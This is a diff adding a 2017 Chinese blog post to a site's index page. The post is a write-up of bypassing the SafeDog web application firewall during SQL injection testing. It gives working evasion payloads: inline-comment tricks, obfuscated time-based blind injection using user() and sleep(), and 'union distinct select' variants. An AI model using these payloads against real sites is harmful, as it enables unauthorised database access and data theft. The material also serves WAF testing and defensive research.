@@ -236,6 +236,90 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-打狗棒法-注入过狗姿势" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/09/24/打狗棒法-注入过狗姿势/" class="article-date">
+      <time datetime="2017-09-24T12:25:04.000Z" itemprop="datePublished">2017-09-24</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/09/24/打狗棒法-注入过狗姿势/">打狗棒法-注入过狗姿势</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <hr>
+<p>前言：作为团队最水的菜鸡，上周终于有时间搞搞自己的事了。本篇文章主要总结绕狗过程中遇到的各种姿势和坑，由于不是专业绕狗选手，希望各位大佬不要嘲笑。</p>
+<hr>
+<h1 id="0x00-各种尝试"><a href="#0x00-各种尝试" class="headerlink" title="0x00 各种尝试"></a>0x00 各种尝试</h1><h3 id="被拦语句"><a href="#被拦语句" class="headerlink" title="被拦语句"></a>被拦语句</h3><p>首先尝试了各种常用的payload，看看狗拦了哪些操作，发现如下语句会拦截：</p>
+<blockquote>
+<p>and 1=1/and ‘a’=’a’类型<br>union select/union distinct select等<br>user()、database()等函数<br>…</p>
+</blockquote>
+<h3 id="放行语句"><a href="#放行语句" class="headerlink" title="放行语句"></a>放行语句</h3><p>在上面尝试中发现如下语句未被拦截：</p>
+<blockquote>
+<p>order by<br>select、union分开使用<br>and if<br>…</p>
+</blockquote>
+<h1 id="0x01-第一种思路"><a href="#0x01-第一种思路" class="headerlink" title="0x01 第一种思路"></a>0x01 第一种思路</h1><p>  先尝试绕过<code>and 1=1/and &#39;a&#39;=&#39;a&#39;</code>的限制<br>  这里可以使用内联注释进行绕过： <code>and /*!1*/=/*!1*/</code>即可绕过<br>  <img src="https://i.loli.net/2017/09/24/59c7ab77294f0.png" alt=""><br>  接着我们尝试一下利用时间盲注来进行绕过，我们先尝试一下正常的语句：</p>
+<blockquote>
+<p> ‘ and if(substr(user(),1,1)=’r’,sleep(5),1– -<br>  这个语句肯定会被拦截，因为含有user()等敏感函数，那么怎么绕过呢，我们试试user/**/()这样的形式<br> ‘ and if(substr(user/**/(),1,1)=’r’,sleep/**/(5),1– -<br>  <img src="https://i.loli.net/2017/09/24/59c7ad8e14c69.png" alt=""></p>
+</blockquote>
+<p>  这里安全狗没有拦截，网站响应时间是6s（没有sleep也有1s的响应，所以延时5s没有问题，虚拟机卡啊T_T）<br>  后续尝试发现，user%0a()也是可以绕过的。</p>
+<blockquote>
+<p>ps:这里提个问题，用这种形式的注入，如何注入到表中内容，暂时没有头绪，望大佬指教。</p>
+</blockquote>
+<h1 id="0x02-第二种思路"><a href="#0x02-第二种思路" class="headerlink" title="0x02 第二种思路"></a>0x02 第二种思路</h1><p>  回到刚才的问题，没有更进一步获取数据，还是把目光聚焦在<code>union select</code>的绕过。<br>  这里试过很多坑，但还是把尝试过的payload发出来，说不定另外的waf能过呢，也包含了一些mysql的特性：</p>
+<blockquote>
+<p>union /*!(select@1*/,2,3)  //select后面可跟@,!,~，如select!1,select~1<br>union/**//**/(/*!select@1*/,2,3)<br>union/*!/**/*//*!(select@1*/,2,3)<br>…</p>
+</blockquote>
+<p>  后来发现怎么也绕不过去，然后查询资料发现union select等价于union distinct select<br>  进行尝试，失败：<br>  <img src="https://i.loli.net/2017/09/24/59c7b80bccb38.png" alt=""><br>  继续尝试，给distinct加内联注释，失败：<br>  <img src="https://i.loli.net/2017/09/24/59c7b8b46f9ce.png" alt=""><br>  在distinct前面加上/**/,成功：<br>  <img src="https://i.loli.net/2017/09/24/59c7b9014a585.png" alt=""></p>
+<h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h1><p>  思路比较混乱，还需了解更多的数据库特性，还有正则表达式，才能深入了解过waf的思路技巧。</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bypass/">bypass</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-Samba远程命令执行漏洞(CVE-2017-7494)攻击演示" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
